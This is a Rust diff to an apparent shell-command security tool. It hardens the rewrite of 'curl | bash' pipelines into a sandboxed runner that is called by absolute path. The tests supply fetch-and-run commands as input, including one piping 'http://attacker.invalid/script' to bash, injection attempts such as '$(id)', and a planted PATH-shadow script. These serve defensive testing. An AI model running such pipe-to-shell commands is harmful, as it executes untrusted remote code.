@@ -125,7 +125,18 @@ pub fn suggest_verified_with_policy(
     verdict: &Verdict,
     policy: &Policy,
 ) -> Vec<SafeSuggestion> {
-    let mut suggestions = suggest_candidates(ctx, verdict, Some(policy));
+    let trusted_runner = trusted_current_tirith_path();
+    suggest_verified_with_policy_and_runner(ctx, verdict, policy, trusted_runner.as_deref())
+}
+
+fn suggest_verified_with_policy_and_runner(
+    ctx: &AnalysisContext,
+    verdict: &Verdict,
+    policy: &Policy,
+    trusted_runner: Option<&Path>,
+) -> Vec<SafeSuggestion> {
+    let mut suggestions =
+        suggest_candidates_with_runner(ctx, verdict, Some(policy), trusted_runner);
     let initial_candidates: Vec<(String, String)> = suggestions
         .iter()
         .filter_map(|suggestion| {
@@ -184,7 +195,12 @@ pub fn suggest_verified_with_policy(
             continue;
         }
 
-        for next in suggest_candidates(&candidate_ctx, &candidate_verdict, Some(policy)) {
+        for next in suggest_candidates_with_runner(
+            &candidate_ctx,
+            &candidate_verdict,
+            Some(policy),
+            trusted_runner,
+        ) {
             let Some(command) = next.safe_command else {
                 continue;
             };
@@ -260,10 +276,11 @@ fn context_with_input(ctx: &AnalysisContext, input: String) -> AnalysisContext {
     }
 }
 
-fn suggest_candidates(
+fn suggest_candidates_with_runner(
     ctx: &AnalysisContext,
     verdict: &Verdict,
     policy: Option<&Policy>,
+    trusted_runner: Option<&Path>,
 ) -> Vec<SafeSuggestion> {
     let cmd = &ctx.input;
     let shell = ctx.shell;
@@ -276,7 +293,13 @@ fn suggest_candidates(
             continue;
         }
         seen.push(finding.rule_id);
-        out.push(build_suggestion(cmd, shell, &segments, finding));
+        out.push(build_suggestion(
+            cmd,
+            shell,
+            &segments,
+            finding,
+            trusted_runner,
+        ));
     }
 
     // Command-shape transforms fire at most once per verdict, only when there
@@ -299,6 +322,7 @@ fn build_suggestion(
     shell: ShellType,
     segments: &[tokenize::Segment],
     finding: &Finding,
+    trusted_runner: Option<&Path>,
 ) -> SafeSuggestion {
     let remediation = crate::rule_explanations::remediation(finding.rule_id).to_string();
     let rule_id = finding.rule_id.to_string();
@@ -308,7 +332,8 @@ fn build_suggestion(
         | RuleId::WgetPipeShell
         | RuleId::HttpiePipeShell
         | RuleId::XhPipeShell
-        | RuleId::PipeToInterpreter => match rewrite_pipe_to_shell(segments, shell) {
+        | RuleId::PipeToInterpreter => match rewrite_pipe_to_shell(segments, shell, trusted_runner)
+        {
             Some(rewrite) => (
                 Some(rewrite),
                 "Delegates the bounded download, in-memory policy review, confirmation, \
@@ -422,11 +447,19 @@ fn pipe_interpreter(name: &str) -> Option<crate::runner::PipeInterpreter> {
 /// caller's shell. Dynamic, malformed, or control-bearing words remain
 /// guidance-only.
 ///
-/// On Unix, the emitted `tirith run` command carries the selected interpreter,
-/// argv, and stdin mode as typed arguments. The runner therefore ignores a
-/// hostile remote shebang and preserves `curl ... | bash`'s stdin semantics.
-/// Other platforms do not expose `tirith run`, so they remain guidance-only.
-fn rewrite_pipe_to_shell(segments: &[tokenize::Segment], shell: ShellType) -> Option<String> {
+/// On x86_64 Linux, the emitted command carries the selected interpreter, argv,
+/// and stdin mode as typed arguments. It invokes the currently-running, validated
+/// Tirith executable by absolute path, so later shell evaluation cannot resolve a
+/// repo/PATH shadow named `tirith`. The runner therefore ignores a hostile remote
+/// shebang and preserves `curl ... | bash`'s stdin semantics. Other architectures
+/// and platforms remain guidance-only until their containment backend can prove
+/// this launch contract end to end.
+fn rewrite_pipe_to_shell(
+    segments: &[tokenize::Segment],
+    shell: ShellType,
+    trusted_runner: Option<&Path>,
+) -> Option<String> {
+    let _ = trusted_runner;
     if segments.len() != 2 {
         return None;
     }
@@ -437,7 +470,12 @@ fn rewrite_pipe_to_shell(segments: &[tokenize::Segment], shell: ShellType) -> Op
     if sink.preceding_separator.as_deref() != Some("|") {
         return None;
     }
-    if shell == ShellType::Cmd {
+    // PowerShell requires the call operator (`&`) before a quoted executable
+    // path.  The tokenizer intentionally does not model that invocation form,
+    // so emitting a quoted absolute Tirith path would produce a string value,
+    // not an executable command.  Keep both Windows shell families
+    // guidance-only until their complete launch grammar is represented.
+    if matches!(shell, ShellType::PowerShell | ShellType::Cmd) {
         return None;
     }
     // Prefix assignments can alter downloader or interpreter behavior. The
@@ -464,26 +502,42 @@ fn rewrite_pipe_to_shell(segments: &[tokenize::Segment], shell: ShellType) -> Op
     }
 
     let encoded_url = encode_shell_literal(&url, shell)?;
-    let mut command = format!(
-        "tirith run --capsule --script-stdin --interpreter {}",
-        interpreter.as_str()
-    );
-    for arg in sink_args {
-        let option = format!("--interpreter-arg={arg}");
-        let encoded = encode_shell_literal(&option, shell)?;
-        command.push(' ');
-        command.push_str(&encoded);
-    }
-    command.push(' ');
-    command.push_str(&encoded_url);
-
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     {
+        let path = trusted_runner?.to_str()?;
+        let encoded_tirith = encode_shell_literal(path, shell)?;
+        let mut command = format!(
+            "{encoded_tirith} run --capsule --script-stdin --interpreter {}",
+            interpreter.as_str()
+        );
+        for arg in sink_args {
+            let option = format!("--interpreter-arg={arg}");
+            let encoded = encode_shell_literal(&option, shell)?;
+            command.push(' ');
+            command.push_str(&encoded);
+        }
+        command.push(' ');
+        command.push_str(&encoded_url);
         Some(command)
     }
-    #[cfg(not(unix))]
+    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
     {
-        let _ = command;
+        let _ = (encoded_url, sink_args, interpreter);
+        None
+    }
+}
+
+fn trusted_current_tirith_path() -> Option<std::path::PathBuf> {
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    {
+        crate::trusted_child::TrustedExecutable::current()
+            .ok()?
+            .require_safe_reinvocation_provenance()
+            .ok()
+            .map(|executable| executable.path().to_path_buf())
+    }
+    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
+    {
         None
     }
 }
@@ -757,6 +811,8 @@ fn supported_fetch_url(command: &str, args: &[String]) -> Option<String> {
     let mut urls = Vec::new();
     match command {
         "curl" => {
+            let mut fail_on_http_error = false;
+            let mut follow_redirects = false;
             for arg in args {
                 if starts_with_http(arg) {
                     urls.push(arg.clone());
@@ -764,6 +820,8 @@ fn supported_fetch_url(command: &str, args: &[String]) -> Option<String> {
                     if !matches!(long, "fail" | "silent" | "show-error" | "location") {
                         return None;
                     }
+                    fail_on_http_error |= long == "fail";
+                    follow_redirects |= long == "location";
                 } else {
                     let short = arg.strip_prefix('-')?;
                     if short.is_empty()
@@ -771,7 +829,17 @@ fn supported_fetch_url(command: &str, args: &[String]) -> Option<String> {
                     {
                         return None;
                     }
+                    fail_on_http_error |= short.contains('f');
+                    follow_redirects |= short.contains('L');
                 }
+            }
+            // Tirith's bounded fetcher follows validated redirects and rejects
+            // every non-2xx response. A curl pipeline has those semantics only
+            // when both -L/--location and -f/--fail are explicit; otherwise the
+            // rewrite could execute different response bytes than the literal
+            // command. Keep mismatched forms guidance-only.
+            if !(fail_on_http_error && follow_redirects) {
+                return None;
             }
         }
         "wget" => {
@@ -1622,7 +1690,12 @@ mod tests {
     // only return a command after whole-command verification.
     fn suggest(cmd: &str, shell: ShellType, verdict: &Verdict) -> Vec<SafeSuggestion> {
         let ctx = default_exec_context(cmd, shell);
-        suggest_candidates(&ctx, verdict, None)
+        suggest_candidates_with_runner(
+            &ctx,
+            verdict,
+            None,
+            Some(Path::new("/usr/local/bin/tirith")),
+        )
     }
 
     fn finding(rule_id: RuleId) -> Finding {
@@ -1641,6 +1714,22 @@ mod tests {
 
     fn verdict_with(findings: Vec<Finding>) -> Verdict {
         Verdict::from_findings(findings, 3, Timings::default())
+    }
+
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    fn assert_injected_tirith_prefix(command: &str, shell: ShellType) {
+        let marker = " run --capsule --script-stdin --interpreter ";
+        let (encoded_program, _) = command
+            .split_once(marker)
+            .unwrap_or_else(|| panic!("missing hardened runner marker: {command}"));
+        let decoded = decode_shell_literal(encoded_program, shell)
+            .unwrap_or_else(|| panic!("runner path is not one literal shell word: {command}"));
+        assert_eq!(
+            decoded, "/usr/local/bin/tirith",
+            "rewrite must bind the injected absolute executable"
+        );
+        assert!(Path::new(&decoded).is_absolute());
+        assert_ne!(encoded_program, "tirith", "bare PATH lookup is forbidden");
     }
 
     #[test]
@@ -1689,55 +1778,144 @@ mod tests {
         );
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn curl_pipe_bash_rewrites_to_hardened_capsule_runner() {
-        let cmd = "curl https://example.com/install.sh | bash";
+        let cmd = "curl -fsSL https://example.com/install.sh | bash";
         let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
         let s = suggest(cmd, ShellType::Posix, &v);
         assert_eq!(s.len(), 1);
         let sc = s[0].safe_command.as_deref().unwrap();
-        assert_eq!(
-            sc,
-            "tirith run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
-        );
+        assert_injected_tirith_prefix(sc, ShellType::Posix);
+        assert!(sc.ends_with(
+            " run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
+        ));
         assert!(!sc.contains("/tmp/"), "{sc}");
         assert!(!sc.contains(" && "), "{sc}");
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn common_curl_body_flags_keep_the_typed_rewrite() {
         let cmd = "curl -fsSL https://example.com/install.sh | bash";
         let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
         let s = suggest(cmd, ShellType::Posix, &v);
-        assert_eq!(
-            s[0].safe_command.as_deref(),
-            Some(
-                "tirith run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
-            )
+        let command = s[0].safe_command.as_deref().expect("runner rewrite");
+        assert_injected_tirith_prefix(command, ShellType::Posix);
+        assert!(command.ends_with(
+            " run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
+        ));
+    }
+
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    #[test]
+    fn curl_rewrite_requires_matching_status_and_redirect_semantics() {
+        for command in [
+            "curl https://example.com/install.sh | bash",
+            "curl -f https://example.com/install.sh | bash",
+            "curl -L https://example.com/install.sh | bash",
+        ] {
+            let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
+            let suggestions = suggest(command, ShellType::Posix, &verdict);
+            assert!(
+                suggestions[0].safe_command.is_none(),
+                "mismatched curl redirect/status semantics must stay guidance-only: {command}"
+            );
+        }
+
+        for command in [
+            "curl -fsSL https://example.com/install.sh | bash",
+            "curl --fail --silent --show-error --location https://example.com/install.sh | bash",
+        ] {
+            let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
+            let suggestions = suggest(command, ShellType::Posix, &verdict);
+            assert!(
+                suggestions[0].safe_command.is_some(),
+                "equivalent curl status/redirect semantics should remain rewritable: {command}"
+            );
+        }
+    }
+
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    #[test]
+    fn pipe_rewrite_is_guidance_only_without_immutable_self_reinvocation() {
+        let ctx = default_exec_context(
+            "curl -fsSL https://example.com/install.sh | bash",
+            ShellType::Posix,
+        );
+        let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
+        let suggestions = suggest_candidates_with_runner(&ctx, &verdict, None, None);
+        assert!(suggestions[0].safe_command.is_none());
+        assert!(suggestions[0]
+            .rationale
+            .contains("No safe executable rewrite"));
+    }
+
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    #[test]
+    fn emitted_absolute_runner_ignores_a_planted_first_path_tirith() {
+        use std::os::unix::fs::PermissionsExt as _;
+
+        let fixture = tempfile::tempdir().expect("PATH-shadow fixture");
+        let marker = fixture.path().join("shadow-ran");
+        let shadow = fixture.path().join("tirith");
+        std::fs::write(
+            &shadow,
+            format!("#!/bin/sh\nprintf shadow > '{}'\n", marker.display()),
+        )
+        .expect("write planted tirith");
+        std::fs::set_permissions(&shadow, std::fs::Permissions::from_mode(0o700))
+            .expect("chmod planted tirith");
+
+        let ctx = default_exec_context(
+            "curl -fsSL https://example.com/install.sh | bash",
+            ShellType::Posix,
+        );
+        let verdict = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
+        let suggestions =
+            suggest_candidates_with_runner(&ctx, &verdict, None, Some(Path::new("/bin/true")));
+        let command = suggestions[0]
+            .safe_command
+            .as_deref()
+            .expect("absolute runner rewrite");
+        assert!(command.starts_with("'/bin/true' run "), "{command}");
+
+        let status = std::process::Command::new("/bin/sh")
+            .args(["-c", command])
+            .env("PATH", fixture.path())
+            .status()
+            .expect("evaluate generated command under hostile PATH");
+        assert!(status.success());
+        assert!(
+            !marker.exists(),
+            "generated command resolved the planted PATH shadow"
         );
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn emitted_capsule_runner_reanalyzes_allow_with_original_policy_snapshot() {
         let ctx = default_exec_context(
-            "curl https://example.com/install.sh | bash",
+            "curl -fsSL https://example.com/install.sh | bash",
             ShellType::Posix,
         );
         let (verdict, policy) = engine::analyze_without_bypass_returning_policy(&ctx);
         assert_ne!(verdict.action, Action::Allow, "original pipeline must flag");
 
-        let suggestions = suggest_verified_with_policy(&ctx, &verdict, &policy);
+        let suggestions = suggest_verified_with_policy_and_runner(
+            &ctx,
+            &verdict,
+            &policy,
+            Some(Path::new("/usr/local/bin/tirith")),
+        );
         let command = suggestions
             .iter()
             .find_map(|suggestion| suggestion.safe_command.as_deref())
             .expect("verified runner command");
-        assert_eq!(
-            command,
-            "tirith run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
-        );
+        assert_injected_tirith_prefix(command, ShellType::Posix);
+        assert!(command.ends_with(
+            " run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
+        ));
 
         let candidate_ctx = context_with_input(&ctx, command.to_string());
         let candidate = engine::analyze_with_policy_without_bypass(&candidate_ctx, &policy);
@@ -1748,27 +1926,59 @@ mod tests {
         );
     }
 
-    #[cfg(not(unix))]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    #[test]
+    fn trusted_runner_composes_tls_transport_and_pipe_fixes_into_one_allow_command() {
+        let ctx = default_exec_context(
+            "curl -k -fsSL http://attacker.invalid/script | bash",
+            ShellType::Posix,
+        );
+        let (verdict, policy) = engine::analyze_without_bypass_returning_policy(&ctx);
+        assert_ne!(verdict.action, Action::Allow);
+
+        let suggestions = suggest_verified_with_policy_and_runner(
+            &ctx,
+            &verdict,
+            &policy,
+            Some(Path::new("/usr/local/bin/tirith")),
+        );
+        let command = suggestions
+            .iter()
+            .find_map(|suggestion| suggestion.safe_command.as_deref())
+            .expect("one fully composed runner command");
+        assert_injected_tirith_prefix(command, ShellType::Posix);
+        assert!(command.ends_with(
+            " run --capsule --script-stdin --interpreter bash 'https://attacker.invalid/script'"
+        ));
+        assert!(!command.contains("curl "));
+        assert!(!command.contains(" -k"));
+
+        let candidate_ctx = context_with_input(&ctx, command.to_string());
+        let candidate = engine::analyze_with_policy_without_bypass(&candidate_ctx, &policy);
+        assert_eq!(candidate.action, Action::Allow);
+    }
+
+    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
     #[test]
     fn pipe_to_shell_is_guidance_only_without_runner_support() {
-        let cmd = "curl https://example.com/install.sh | bash";
+        let cmd = "curl -fsSL https://example.com/install.sh | bash";
         let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
         let s = suggest(cmd, ShellType::Posix, &v);
         assert!(s[0].safe_command.is_none());
         assert!(s[0].rationale.contains("No safe executable rewrite"));
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn wget_stdout_pipe_sh_uses_same_hardened_runner() {
         let cmd = "wget -qO- https://example.com/x.sh | sh";
         let v = verdict_with(vec![finding(RuleId::WgetPipeShell)]);
         let s = suggest(cmd, ShellType::Posix, &v);
         let sc = s[0].safe_command.as_deref().unwrap();
-        assert_eq!(
-            sc,
-            "tirith run --capsule --script-stdin --interpreter sh 'https://example.com/x.sh'"
-        );
+        assert_injected_tirith_prefix(sc, ShellType::Posix);
+        assert!(sc.ends_with(
+            " run --capsule --script-stdin --interpreter sh 'https://example.com/x.sh'"
+        ));
         assert!(!sc.contains("wget "), "{sc}");
     }
 
@@ -1783,7 +1993,7 @@ mod tests {
     #[test]
     fn pipe_with_extra_stage_yields_no_rewrite() {
         // Three segments — too complex for a correct one-line rewrite.
-        let cmd = "curl https://example.com/x.sh | tac | bash";
+        let cmd = "curl -fsSL https://example.com/x.sh | tac | bash";
         let v = verdict_with(vec![finding(RuleId::PipeToInterpreter)]);
         let s = suggest(cmd, ShellType::Posix, &v);
         assert_eq!(s.len(), 1);
@@ -1793,7 +2003,7 @@ mod tests {
 
     #[test]
     fn pipe_with_two_urls_yields_no_rewrite() {
-        let cmd = "curl https://a.example/x https://b.example/y | bash";
+        let cmd = "curl -fsSL https://a.example/x https://b.example/y | bash";
         let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
         let s = suggest(cmd, ShellType::Posix, &v);
         assert!(s[0].safe_command.is_none());
@@ -1847,7 +2057,7 @@ mod tests {
 
     #[test]
     fn plain_http_rewritten_to_https() {
-        let cmd = "curl http://example.com/install.sh | bash";
+        let cmd = "curl -fsSL http://example.com/install.sh | bash";
         let v = verdict_with(vec![finding(RuleId::PlainHttpToSink)]);
         let s = suggest(cmd, ShellType::Posix, &v);
         let sc = s[0].safe_command.as_deref().unwrap();
@@ -1873,7 +2083,7 @@ mod tests {
 
     #[test]
     fn duplicate_rule_ids_deduplicated() {
-        let cmd = "curl https://example.com/x.sh | bash";
+        let cmd = "curl -fsSL https://example.com/x.sh | bash";
         let v = verdict_with(vec![
             finding(RuleId::CurlPipeShell),
             finding(RuleId::CurlPipeShell),
@@ -1889,29 +2099,27 @@ mod tests {
         assert_eq!(v.action, Action::Allow);
     }
 
-    #[cfg(unix)]
     #[test]
-    fn powershell_exe_interpreter_is_guidance_only_on_unix_runner() {
-        let cmd = "curl https://example.com/x.sh | bash.exe";
+    fn powershell_exe_interpreter_is_guidance_only() {
+        let cmd = "curl -fsSL https://example.com/x.sh | bash.exe";
         let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
         let s = suggest(cmd, ShellType::PowerShell, &v);
         assert!(s[0].safe_command.is_none());
     }
 
-    #[cfg(unix)]
     #[test]
-    fn powershell_literal_decode_and_reencode_doubles_embedded_quote() {
-        let cmd = "curl 'https://example.com/a''b' | bash";
+    fn powershell_pipe_rewrite_is_guidance_only_without_call_operator_model() {
+        let cmd = "curl -fsSL 'https://example.com/a''b' | bash";
         let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
         let s = suggest(cmd, ShellType::PowerShell, &v);
-        let command = s[0].safe_command.as_deref().expect("runner rewrite");
+        assert!(s[0].safe_command.is_none());
         assert_eq!(
-            command,
-            "tirith run --capsule --script-stdin --interpreter bash 'https://example.com/a''b'"
+            decode_powershell_literal("'https://example.com/a''b'").as_deref(),
+            Some("https://example.com/a'b")
         );
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn powershell_doubled_double_quote_is_decoded_not_dropped() {
         assert_eq!(
@@ -1922,29 +2130,27 @@ mod tests {
         // executable suggestion must be withheld rather than silently changing
         // `a"b` into `ab`.
         assert!(pipe_suggestion(
-            r#"curl "https://example.com/a""b" | bash"#,
+            r#"curl -fsSL "https://example.com/a""b" | bash"#,
             ShellType::PowerShell
         )
         .is_none());
     }
 
-    #[cfg(unix)]
     #[test]
-    fn powershell_backtick_literal_decodes_before_single_quote_reencoding() {
-        let cmd = r#"curl "https://example.com/a`'b" | bash"#;
+    fn powershell_backtick_literal_decodes_but_rewrite_remains_guidance_only() {
+        let cmd = r#"curl -fsSL "https://example.com/a`'b" | bash"#;
         let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
         let s = suggest(cmd, ShellType::PowerShell, &v);
+        assert!(s[0].safe_command.is_none());
         assert_eq!(
-            s[0].safe_command.as_deref(),
-            Some(
-                "tirith run --capsule --script-stdin --interpreter bash 'https://example.com/a''b'"
-            )
+            decode_powershell_literal(r#""https://example.com/a`'b""#).as_deref(),
+            Some("https://example.com/a'b")
         );
     }
 
     #[test]
     fn cmd_pipe_to_shell_remains_guidance_only() {
-        let cmd = "curl https://example.com/x.sh | bash.exe";
+        let cmd = "curl -fsSL https://example.com/x.sh | bash.exe";
         let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
         let s = suggest(cmd, ShellType::Cmd, &v);
         assert!(s[0].safe_command.is_none());
@@ -1952,7 +2158,7 @@ mod tests {
 
     #[test]
     fn every_suggestion_has_nonempty_remediation_and_rationale() {
-        let cmd = "curl http://example.com/x.sh | bash";
+        let cmd = "curl -fsSL http://example.com/x.sh | bash";
         let v = verdict_with(vec![
             finding(RuleId::CurlPipeShell),
             finding(RuleId::PlainHttpToSink),
@@ -1983,7 +2189,9 @@ mod tests {
     fn pipeline_rejected_for_env_scrub() {
         // The piped second stage still inherits the original env — refuse.
         assert!(!is_simple_command_for_env_scrub("npm install foo | sh"));
-        assert!(!is_simple_command_for_env_scrub("curl https://foo | bash"));
+        assert!(!is_simple_command_for_env_scrub(
+            "curl -fsSL https://foo | bash"
+        ));
     }
 
     #[test]
@@ -2140,17 +2348,20 @@ mod tests {
 
     // ── rewrite_pipe_to_shell — one runner invocation, quoted URL ──────────
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     fn pipe_suggestion(cmd: &str, shell: ShellType) -> Option<String> {
         let v = verdict_with(vec![finding(RuleId::CurlPipeShell)]);
         suggest(cmd, shell, &v)[0].safe_command.clone()
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn single_quoted_dollar_syntax_is_literal_and_round_trips() {
-        let sc = pipe_suggestion("curl 'https://example.com/$(id)' | bash", ShellType::Posix)
-            .expect("single quotes make the URL bytes literal");
+        let sc = pipe_suggestion(
+            "curl -fsSL 'https://example.com/$(id)' | bash",
+            ShellType::Posix,
+        )
+        .expect("single quotes make the URL bytes literal");
         assert!(
             sc.contains("'https://example.com/$(id)'"),
             "URL must stay single-quoted so $(id) cannot execute: {sc}"
@@ -2160,35 +2371,36 @@ mod tests {
                 .contains("$(id)"),
             "no bare $(id) may survive outside the quoted token: {sc}"
         );
+        assert_injected_tirith_prefix(&sc, ShellType::Posix);
         assert!(
-            sc.starts_with("tirith run --capsule --script-stdin --interpreter bash "),
+            sc.contains(" run --capsule --script-stdin --interpreter bash "),
             "{sc}"
         );
         assert!(!sc.contains("/tmp/"), "{sc}");
         assert!(!sc.contains(" && "), "{sc}");
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn dynamic_unquoted_url_is_guidance_only() {
-        assert!(pipe_suggestion("curl $URL | bash", ShellType::Posix).is_none());
+        assert!(pipe_suggestion("curl -fsSL $URL | bash", ShellType::Posix).is_none());
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn carriage_return_host_mutation_is_rejected_not_sanitized() {
-        let cmd = "curl 'https://exa\rmple.com/install.sh' | bash";
+        let cmd = "curl -fsSL 'https://exa\rmple.com/install.sh' | bash";
         assert!(pipe_suggestion(cmd, ShellType::Posix).is_none());
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn posix_escaped_space_url_is_rejected_as_non_exact_url() {
-        let cmd = r"curl https://example.com/a\ b | bash";
+        let cmd = r"curl -fsSL https://example.com/a\ b | bash";
         assert!(pipe_suggestion(cmd, ShellType::Posix).is_none());
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn wget_requires_an_explicit_stdout_body_shape() {
         let cmd = "wget -qO- 'https://example.com/$(id)' | sh";
@@ -2205,10 +2417,10 @@ mod tests {
         );
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn posix_embedded_single_quote_round_trips() {
-        let cmd = r#"curl "https://example.com/a'b" | bash"#;
+        let cmd = r#"curl -fsSL "https://example.com/a'b" | bash"#;
         let sc = pipe_suggestion(cmd, ShellType::Posix).expect("literal URL rewrite");
         assert!(
             sc.contains(r"'https://example.com/a'\''b'"),
@@ -2216,7 +2428,7 @@ mod tests {
         );
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn supported_shells_are_preserved_as_typed_stdin_interpreters() {
         for (sink, shell) in [
@@ -2225,7 +2437,7 @@ mod tests {
             ("fish", ShellType::Fish),
             ("ash", ShellType::Posix),
         ] {
-            let cmd = format!("curl https://example.com/install.sh | {sink}");
+            let cmd = format!("curl -fsSL https://example.com/install.sh | {sink}");
             let rewrite = pipe_suggestion(&cmd, shell).expect("supported stdin shell");
             assert!(
                 rewrite.contains(&format!("--interpreter {sink}")),
@@ -2235,7 +2447,7 @@ mod tests {
         }
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn fish_bare_backslash_escapes_are_always_guidance_only() {
         // Fish gives bare backslashes semantic escape behavior (including
@@ -2274,12 +2486,14 @@ mod tests {
             );
         }
 
-        assert!(
-            pipe_suggestion(r"curl https://example.com/\x61 | fish", ShellType::Fish).is_none()
-        );
+        assert!(pipe_suggestion(
+            r"curl -fsSL https://example.com/\x61 | fish",
+            ShellType::Fish
+        )
+        .is_none());
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn fish_generated_literal_matches_runtime_argv_when_fish_is_installed() {
         let Ok(fish) = crate::trusted_child::resolve_ambient("fish") else {
@@ -2302,11 +2516,11 @@ mod tests {
         assert_eq!(output.stdout, value.as_bytes());
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn bash_s_double_dash_operands_are_preserved_as_typed_argv() {
         let rewrite = pipe_suggestion(
-            "curl https://example.com/install.sh | bash -s -- feature",
+            "curl -fsSL https://example.com/install.sh | bash -s -- feature",
             ShellType::Posix,
         )
         .expect("supported bash stdin argv");
@@ -2319,46 +2533,46 @@ mod tests {
         }
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn unsupported_interpreter_args_remain_guidance_only() {
         assert!(pipe_suggestion(
-            "curl https://example.com/install.sh | bash -e",
+            "curl -fsSL https://example.com/install.sh | bash -e",
             ShellType::Posix
         )
         .is_none());
         assert!(pipe_suggestion(
-            "curl https://example.com/install.sh | fish -c 'source'",
+            "curl -fsSL https://example.com/install.sh | fish -c 'source'",
             ShellType::Fish
         )
         .is_none());
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn source_or_sink_environment_prefix_is_guidance_only() {
         assert!(pipe_suggestion(
-            "HTTPS_PROXY=https://proxy.example curl https://example.com/install.sh | bash",
+            "HTTPS_PROXY=https://proxy.example curl -fsSL https://example.com/install.sh | bash",
             ShellType::Posix
         )
         .is_none());
         assert!(pipe_suggestion(
-            "curl https://example.com/install.sh | MODE=feature bash",
+            "curl -fsSL https://example.com/install.sh | MODE=feature bash",
             ShellType::Posix
         )
         .is_none());
     }
 
-    #[cfg(unix)]
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn powershell_control_backtick_and_dynamic_expansion_are_rejected() {
         assert!(pipe_suggestion(
-            r#"curl "https://exa`rmple.com/install.sh" | bash"#,
+            r#"curl -fsSL "https://exa`rmple.com/install.sh" | bash"#,
             ShellType::PowerShell
         )
         .is_none());
         assert!(pipe_suggestion(
-            r#"curl "https://example.com/$env:PAYLOAD" | bash"#,
+            r#"curl -fsSL "https://example.com/$env:PAYLOAD" | bash"#,
             ShellType::PowerShell
         )
         .is_none());
